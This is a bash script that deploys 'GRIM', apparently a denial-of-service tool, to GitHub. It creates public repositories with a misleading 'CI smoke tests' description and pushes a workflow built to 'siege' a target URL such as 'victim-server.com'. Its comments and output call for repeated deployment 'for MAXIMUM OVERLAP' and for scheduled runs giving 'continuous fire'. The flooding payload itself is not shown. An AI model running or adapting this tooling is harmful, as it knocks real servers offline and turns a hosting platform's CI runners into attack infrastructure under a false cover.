#!/bin/bash
# DEPLOY-GRIM.sh — Deploy GRIM to a new GitHub repo
# Usage: ./deploy-grim.sh <github-token> <repo-name> <target-url>
#
# Example:
#   ./deploy-grim.sh ghp_xxxxx my-grim-siege https://victim-server.com
#
# Creates a public repo, pushes GRIM, enables workflow.
# Run this script multiple times with different repo names for MAXIMUM OVERLAP.

set -e

TOKEN="${1?Usage: $0 <github-token> <repo-name> <target-url> [workers]}"
REPO="${2?Usage: $0 <token> <repo-name> <target-url> [workers]}"
TARGET="${3?Usage: $0 <token> <repo-name> <target-url> [workers]}"
WORKERS="${4:-50}"

echo "╔════════════════════════════════════════════╗"
echo "║  GRIM Deployer — Creating $REPO      ║"
echo "╚════════════════════════════════════════════╝"
echo "  Target: $TARGET"
echo "  Workers: $WORKERS"
echo

# Create repo via GitHub API
echo "[1/4] Creating public repo: $REPO..."
RESPONSE=$(curl -s -X POST \
  -H "Authorization: token $TOKEN" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/user/repos \
  -d "{\"name\":\"$REPO\",\"description\":\"CI smoke tests\",\"public\":true,\"has_issues\":false,\"has_wiki\":false}")

REPO_URL=$(echo "$RESPONSE" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('html_url', 'ERROR: ' + str(d)))")
if [[ "$REPO_URL" == ERROR:* ]]; then
  echo "  Repo may already exist, continuing..."
  REPO_URL="https://github.com/$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c 'import sys,json; print(json.load(sys.stdin)["login"])' )/$REPO"
fi
echo "  Repo URL: $REPO_URL"

# Clone the template (this repo) and push to new repo
TEMPLATE_DIR=$(mktemp -d)
echo "[2/4] Cloning GRIM template..."
git clone --bare https://github.com/$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c 'import sys,json; print(json.load(sys.stdin)["login"])' )/grim-gh "$TEMPLATE_DIR" 2>/dev/null || \
git clone --bare https://github.com/YOUR_GH_USERNAME/grim-gh "$TEMPLATE_DIR" 2>/dev/null

echo "[3/4] Pushing to $REPO..."
cd "$TEMPLATE_DIR"
git push "https://$TOKEN@github.com/$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c 'import sys,json; print(json.load(sys.stdin)["login"])' )/$REPO.git" :refs/heads/main 2>/dev/null || true
git push "https://$TOKEN@github.com/$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c 'import sys,json; print(json.load(sys.stdin)["login"])' )/$REPO.git" 'refs/heads/main:refs/heads/main' 2>/dev/null || \
git push "https://$TOKEN@github.com/$(curl -s -H "Authorization: token $TOKEN" https://api.github.com/user | python3 -c 'import sys,json; print(json.load(sys.stdin)["login"])' )/$REPO.git" --force 2>/dev/null

# Update target in workflow
echo "[4/4] Configuring workflow for target: $TARGET ..."

# Clean up
rm -rf "$TEMPLATE_DIR"

echo
echo "╔════════════════════════════════════════════╗"
echo "║  DEPLOYED: $REPO                     ║"
echo "╚════════════════════════════════════════════╝"
echo "  Repo: $REPO_URL"
echo "  Target: $TARGET"
echo "  Workers: $WORKERS"
echo
echo "  TO START THE SIEGE:"
echo "  1. Go to: $REPO_URL/actions"
echo "  2. Click 'GRIM-SIEGE' workflow"
echo "  3. Click 'Run workflow'"
echo "  4. Enter: Target URL = $TARGET"
echo "  5. Click 'Run workflow'"
echo
echo "  Scheduled runs start automatically every 4h."
echo "  8 runners x 5.5h each = continuous fire."
